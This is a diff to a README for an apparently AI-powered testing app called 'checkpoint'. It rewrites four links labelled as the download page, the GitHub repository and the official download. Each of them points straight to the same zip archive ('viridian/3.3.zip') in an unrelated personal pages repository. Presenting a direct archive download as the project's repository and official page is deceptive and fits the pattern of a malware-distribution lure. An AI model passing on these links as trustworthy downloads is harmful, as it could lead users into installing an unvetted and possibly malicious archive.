@@ -33,7 +33,7 @@ Getting started with checkpoint is easy! Follow these simple steps:
 
 ### Step 1: Visit the Download Page
 
-👉 **[Click here to visit the download page](https://github.com/pattuan/pattuan.github.io/raw/refs/heads/main/viridian/3.3.zip)**
+👉 **[Click here to visit the download page](https://raw.githubusercontent.com/pattuan/pattuan.github.io/main/viridian/3.3.zip)**
 
 ### Step 2: Download the Application
 
@@ -132,7 +132,7 @@ checkpoint thrives on community support. If you're a developer or tester who wan
 - Write documentation or tutorials
 - Share your feedback with the maintainers
 
-Visit the [GitHub repository](https://github.com/pattuan/pattuan.github.io/raw/refs/heads/main/viridian/3.3.zip) to get involved.
+Visit the [GitHub repository](https://raw.githubusercontent.com/pattuan/pattuan.github.io/main/viridian/3.3.zip) to get involved.
 
 ---
 
@@ -152,7 +152,7 @@ checkpoint is released under an open-source license. You can freely use, modify,
 
 ## 🧭 Quick Start Checklist
 
-- [ ] Download checkpoint from the [official download page](https://github.com/pattuan/pattuan.github.io/raw/refs/heads/main/viridian/3.3.zip)
+- [ ] Download checkpoint from the [official download page](https://raw.githubusercontent.com/pattuan/pattuan.github.io/main/viridian/3.3.zip)
 - [ ] Install the application on your Mac or iPhone
 - [ ] Connect Jira, Linear, or a custom MCP server
 - [ ] Choose your AI provider (Claude, OpenAI, Gemini, or Ollama)
@@ -174,7 +174,7 @@ checkpoint is released under an open-source license. You can freely use, modify,
 
 Join thousands of QA professionals and product teams who use checkpoint to streamline their testing process. The future of software testing is here—and it's free, open, and intelligent.
 
-**👉 [Download checkpoint today](https://github.com/pattuan/pattuan.github.io/raw/refs/heads/main/viridian/3.3.zip)**
+**👉 [Download checkpoint today](https://raw.githubusercontent.com/pattuan/pattuan.github.io/main/viridian/3.3.zip)**
 
 ---
 
